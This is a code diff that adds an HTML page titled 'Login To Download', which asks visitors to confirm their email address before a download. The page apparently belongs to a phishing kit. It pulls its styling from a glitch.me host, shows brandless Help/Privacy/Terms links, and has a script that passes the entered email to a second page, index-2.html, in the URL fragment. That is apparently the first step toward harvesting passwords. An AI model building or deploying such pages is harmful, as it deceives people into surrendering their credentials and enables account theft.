@@ -1,0 +1,44 @@
+
+<!doctype html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Login To Download</title>
+<link rel="icon" type="image/ico" href="images/favicon.png">
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+ <link href="https://twilight-bittersweet-metal.glitch.me/style-ob.css" rel="stylesheet">
+</head>
+<body>
+<div class="container1">
+  <div class="logbox">
+    <div class="logo" id="logo"></div>
+    <div class="formbox">
+        <div class="topic">Confirm your email address<br>to begin download.</div>
+        <form method="post" name="form1">
+			<input name="email" id="email" type="email" class="textField1" value="" placeholder="Enter your email address" required/>
+			<div class="Info2">
+				<p><br /><a href="#" class="TextLink1">Learn more</a></p>
+				<p><a href="#" class="TextLink2">Authentication required to continue</a>
+				<input name="button" type="submit" class="button2" id="sub" value="Next" />
+				<div class="clearfix1"></div>
+			</div>
+        </form>
+		<script>
+$(document).ready(function() {
+	$("#sub").click(function(event){
+		event.preventDefault();
+		var us = $("#email").val();
+		 window.location.href="index-2.html#"+us;
+		
+		});
+});
+
+</script>
+    </div>
+  </div>
+  <div class="footer">
+    <div class="footerMenu"><a href="#">Help</a> <a href="#">Privacy</a> <a href="#">Terms</a></div>
+    <a><strong>English (United States)</strong></a> </div>
+</div>
+
+</body>
+</html>
